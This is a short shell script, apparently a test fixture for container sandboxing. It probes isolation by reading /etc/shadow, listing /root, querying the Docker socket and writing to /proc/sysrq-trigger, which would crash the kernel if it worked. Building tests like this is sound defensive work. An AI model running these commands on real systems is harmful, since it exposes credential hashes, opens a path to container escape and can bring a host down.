#!/bin/sh
# Simulates various privilege escalation and container escape techniques
echo "Starting malicious escape script..."

# 1. Try to read shadow file
cat /etc/shadow 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[!] SUCCESS: Read /etc/shadow"
else
    echo "[-] FAILED: Cannot read /etc/shadow"
fi

# 2. Try to list root directory
ls -la /root 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[!] SUCCESS: Listed /root"
else
    echo "[-] FAILED: Cannot list /root"
fi

# 3. Try to access Docker socket
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[!] SUCCESS: Accessed docker.sock"
else
    echo "[-] FAILED: Cannot access docker.sock"
fi

# 4. Try to write to sysrq-trigger
echo c > /proc/sysrq-trigger 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[!] SUCCESS: Wrote to sysrq-trigger"
else
    echo "[-] FAILED: Cannot write to sysrq-trigger"
fi

echo "Malicious script finished."
